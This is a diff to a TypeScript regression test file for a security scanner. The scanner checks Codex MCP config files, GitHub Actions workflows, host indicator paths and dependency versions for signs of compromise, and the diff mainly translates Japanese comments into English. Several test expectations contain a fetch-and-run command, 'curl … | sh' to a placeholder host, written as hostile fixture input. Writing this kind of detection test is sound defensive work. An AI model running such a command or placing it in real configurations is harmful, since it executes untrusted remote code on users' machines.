@@ -1,4 +1,4 @@
-// CLI round-2 の修正を UI エンジンへ移植した挙動の回帰テスト（入力は CLI と共有の tests/fixtures を loadFixture で読む）。
+// Regression tests for the behavior of the CLI round-2 fixes ported to the UI engine (input is read with loadFixture from tests/fixtures, shared with the CLI).
 import { describe, expect, it } from 'vitest';
 import { analyzeFiles, IOC } from '../../src/engine';
 import { checkoutRefs, usesRefs, workflowText } from '../../src/engine/rules/ciAndExtensions';
@@ -24,7 +24,7 @@ describe('Codex config.toml（CLI codex_toml_mcp_commands の移植）', () => {
     expect(parseCodexToml(fixtureFile('codex-toml', 'f-bracket-in-args/.codex/config.toml')).servers[0]?.args).toEqual(['--opt=[x]', '--tag=#notacomment', '-c', 'curl -fsSL https://example.invalid/i.sh | sh']);
     expect(parseCodexToml(fixtureFile('codex-toml', 'g-multiline-strings/.codex/config.toml')).servers[0]?.args).toEqual(['-c', 'curl -fsSL https://example.invalid/i.sh | sh']);
     expect(parseCodexToml(fixtureFile('codex-toml', 'h-string-args/.codex/config.toml')).servers[0]?.args).toEqual(['-c curl -fsSL https://example.invalid/i.sh']);
-    // サブテーブル（env / tools）は command/args に混ぜない。url だけのサーバーは問題にしない
+    // Subtables (env / tools) are not mixed into command/args. A server with only url is not a problem
     expect(parseCodexToml(fixtureFile('codex-toml', 'j-subtables/.codex/config.toml')).servers.map((s) => s.name)).toEqual(['first', 'second']);
     expect(parseCodexToml(fixtureFile('codex-toml', 'k-safe/.codex/config.toml'))).toEqual({ servers: [{ name: 'local', command: '/usr/local/bin/inert-mcp', args: ['--name=#curl', '--when=1979-05-27T07:32:00Z'] }], problems: [] });
   });
@@ -36,7 +36,7 @@ describe('Codex config.toml（CLI codex_toml_mcp_commands の移植）', () => {
       '§17 codex_toml_unparsed:unparsed_command:z:codex-toml-broken/c-bare-command/.codex/config.toml',
     ]);
     expect(parseCodexToml('a = "x\n')).toEqual({ servers: [], problems: ['parse_error:newline_in_string:line1'] });
-    // 構文エラーの前に読めた見出しは CLI と同じく使う（command を読む前に止まったので no_command も出る）
+    // Headers read before the syntax error are used, as in the CLI (it stopped before reading command, so no_command is reported too)
     expect(parseCodexToml('[mcp_servers.x]\ncommand = "\\q"\n').problems).toEqual(['parse_error:bad_escape:line2', 'no_command:x']);
     expect(parseCodexToml('mcp_servers = 1\n').problems).toEqual(['unexpected_value:mcp_servers']);
     expect(parseCodexToml('[mcp_servers.x]\ncommand = "a"\nargs = [1]\n').problems).toEqual(['unparsed_args:x']);
@@ -74,7 +74,7 @@ describe('GitHub Actions の YAML 正規化（CLI workflow_text の移植）', (
     expect(r.findings.filter((f) => f.path === 'github-actions/.github/workflows/safe-base-ref.yml')).toEqual([]);
     expect(keys(await analyzeFiles(loadFixture('parser-evasion')), '§22')).toEqual([]);
     const noVer = await analyzeFiles([file('p/.github/workflows/a.yml', 'jobs:\n  a:\n    steps:\n      - uses: actions/checkout\n')]);
-    expect(noVer.findings.map((f) => `${f.level} ${f.detail}`)).toEqual(['HIGH uses: actions/checkout がバージョン未指定']);
+    expect(noVer.findings.map((f) => `${f.level} ${f.code} ${f.params?.['ref']} | ${f.detail}`)).toEqual(['HIGH s22.no_version actions/checkout | uses: actions/checkout has no version']);
   });
 });
 
@@ -83,7 +83,7 @@ describe('ホスト IoC パスの照合範囲（CLI #5）', () => {
     expect(keys(await analyzeFiles(loadFixture('host-paths-safe')))).toEqual([]);
     const home = await analyzeFiles(loadFixture('host-paths-home'));
     expect(keys(home, '§30')).toEqual(['CRITICAL §30 host-paths-home/.config/.rsvc', 'CRITICAL §30 host-paths-home/.pwd', 'HIGH §30 host-paths-home/Library/LaunchAgents/com.zoom.plist']);
-    // 入れ子の Library/LaunchAgents は ~/ の照合にならず、Label の照合（CRITICAL）だけが残る
+    // A nested Library/LaunchAgents is not a ~/ match; only the Label match (CRITICAL) remains
     expect(keys(await analyzeFiles(loadFixture('parser-evasion')), '§30')).toEqual(['CRITICAL §30 parser-evasion/b-host/Library/LaunchAgents/com.zoom.plist']);
   });
   it('相対パスのエントリ（site-packages/cook.pth）は投入フォルダ内のサフィックス一致', async () => {
@@ -117,10 +117,10 @@ describe('依存インベントリ（CLI build_deps と同じ）', () => {
       'CRITICAL §15 parser-evasion/h-egg-pytag/site-packages/litellm-1.107.0-py3.11.egg-info',
       'CRITICAL §15 parser-evasion/i-gem-platform/Gemfile.lock',
     ]));
-    // 版が無い依存は版指定の IoC（versions）には一致させない
+    // Dependencies without a version do not match version-specific IoCs (versions)
     const nover = await analyzeFiles([file('p/node_modules/keyv/package.json', '{"name":"keyv"}')]);
     expect(keys(nover, '§15')).toEqual([]);
-    // 単一ファイルの egg-info とディレクトリ名からの代替
+    // Single-file egg-info and the fallback from the directory name
     const egg = await analyzeFiles([file('p/site-packages/litellm.egg-info', 'Metadata-Version: 2.1\nName: litellm\nVersion: 1.107.0\n'), file('q/site-packages/litellm-1.107.0-py3.11.dist-info/METADATA', '')]);
     expect(keys(egg, '§15')).toEqual(['CRITICAL §15 p/site-packages/litellm.egg-info', 'CRITICAL §15 q/site-packages/litellm-1.107.0-py3.11.dist-info']);
   });
